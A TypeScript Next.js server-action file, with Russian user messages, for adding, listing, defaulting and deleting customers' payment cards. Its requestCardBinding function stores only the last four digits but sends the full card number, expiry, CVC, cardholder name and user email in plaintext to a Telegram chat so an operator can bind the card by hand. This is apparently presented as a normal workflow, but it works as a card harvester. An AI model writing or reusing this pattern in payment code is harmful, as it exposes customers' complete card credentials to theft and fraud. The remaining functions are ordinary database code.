"use server"

import { and, asc, count, desc, eq, sql } from "drizzle-orm"
import { headers } from "next/headers"
import { revalidatePath } from "next/cache"
import { auth } from "@/lib/auth"
import { db } from "@/lib/db"
import { paymentCard } from "@/lib/db/schema"
import { CARD_BRAND_LABEL, detectBank, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, normalizeCardNumber, type CardBrand } from "@/lib/payment-cards"
import { escapeTelegram, notifyTelegram } from "@/lib/telegram"

export type PaymentCardView = {
  id: number
  brand: CardBrand
  last4: string
  bankName: string | null
  cardholder: string
  expMonth: number | null
  expYear: number | null
  isDefault: boolean
  status: string
}

type CardsResult = { ok: true; cards: PaymentCardView[] }
export type BindingRequestResult = { ok: true; cards: PaymentCardView[] } | { ok: false; error: string }

const MAX_CARDS = 5
const MAX_PENDING = 2

async function getSessionUser() {
  const session = await auth.api.getSession({ headers: await headers() })
  if (!session?.user) throw new Error("Unauthorized")
  return session.user
}

async function getUserId() {
  return (await getSessionUser()).id
}

async function listCards(userId: string): Promise<PaymentCardView[]> {
  const rows = await db.select().from(paymentCard)
    .where(eq(paymentCard.userId, userId))
    .orderBy(desc(paymentCard.isDefault), asc(paymentCard.createdAt))
  return rows.map((r) => ({
    id: r.id, brand: r.brand as CardBrand, last4: r.last4, bankName: r.bankName,
    cardholder: r.cardholder, expMonth: r.expMonth, expYear: r.expYear,
    isDefault: r.isDefault, status: r.status,
  }))
}

export async function getPaymentCards() {
  return listCards(await getUserId())
}

export async function requestCardBinding(input: {
  cardholder: string
  cardNumber: string
  expMonth: number
  expYear: number
  cvc: string
}): Promise<BindingRequestResult> {
  const user = await getSessionUser()
  const cardholder = String(input.cardholder ?? "").trim().replace(/\s+/g, " ").toUpperCase()
  const cardNumber = normalizeCardNumber(String(input.cardNumber ?? ""))
  const expMonth = Number(input.expMonth)
  const expYear = Number(input.expYear)
  const cvc = String(input.cvc ?? "").replace(/\D/g, "")

  if (!/^[A-ZА-ЯЁ][A-ZА-ЯЁ' -]{1,59}$/.test(cardholder)) return { ok: false, error: "Укажите имя держателя как на карте." }
  if (cardNumber.length !== 16 || !luhnValid(cardNumber)) return { ok: false, error: "Проверьте номер карты — нужно 16 цифр." }
  if (!Number.isInteger(expMonth) || !Number.isInteger(expYear) || !isExpiryValid(expMonth, expYear)) {
    return { ok: false, error: "Проверьте срок действия карты (ММ/ГГ)." }
  }
  if (cvc.length < 3 || cvc.length > 4) return { ok: false, error: "Укажите код CVC/CVV с обратной стороны карты." }

  const brand = detectBrand(cardNumber)
  const bankName = detectBank(cardNumber) ?? ""
  const last4 = cardNumber.slice(-4)

  const created = await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${user.id}))`)
    const [{ total }] = await tx.select({ total: count() }).from(paymentCard).where(eq(paymentCard.userId, user.id))
    if (total >= MAX_CARDS) return { error: `Можно привязать не больше ${MAX_CARDS} карт.` }
    const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
      .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "pending")))
    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки текущих заявок на привязку." }
    const [row] = await tx.insert(paymentCard).values({
      userId: user.id, brand, last4, bankName: bankName || null, cardholder,
      expMonth, expYear,
      fingerprint: `request:${crypto.randomUUID()}`, status: "pending",
    }).returning({ id: paymentCard.id })
    return { id: row.id }
  })
  if ("error" in created) return { ok: false, error: created.error as string }

  void notifyTelegram([
    `<b>Заявка на привязку карты #${created.id}</b>`,
    `Номер: <code>${formatCardNumber(cardNumber)}</code>`,
    `Срок: ${escapeTelegram(formatExpiry(expMonth, expYear))} · CVC: <code>${escapeTelegram(cvc)}</code>`,
    `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
    `Держатель: ${escapeTelegram(cardholder)}`,
    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
    "Привяжите карту в bePaid и подтвердите в админ-панели.",
  ].join("\n"))

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(user.id) }
}

export async function setDefaultPaymentCard(id: number): Promise<PaymentCardView[]> {
  const userId = await getUserId()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
    const [owned] = await tx.select({ id: paymentCard.id }).from(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId), eq(paymentCard.status, "confirmed")))
    if (!owned) return
    await tx.update(paymentCard).set({ isDefault: false }).where(eq(paymentCard.userId, userId))
    await tx.update(paymentCard).set({ isDefault: true }).where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
  })
  revalidatePath("/cabinet/cards")
  return listCards(userId)
}

export async function deletePaymentCard(id: number): Promise<CardsResult> {
  const userId = await getUserId()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
    const [removed] = await tx.delete(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
      .returning({ isDefault: paymentCard.isDefault })
    if (removed?.isDefault) {
      const [next] = await tx.select({ id: paymentCard.id }).from(paymentCard)
        .where(and(eq(paymentCard.userId, userId), eq(paymentCard.status, "confirmed")))
        .orderBy(asc(paymentCard.createdAt)).limit(1)
      if (next) await tx.update(paymentCard).set({ isDefault: true })
        .where(and(eq(paymentCard.id, next.id), eq(paymentCard.userId, userId)))
    }
  })
  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}
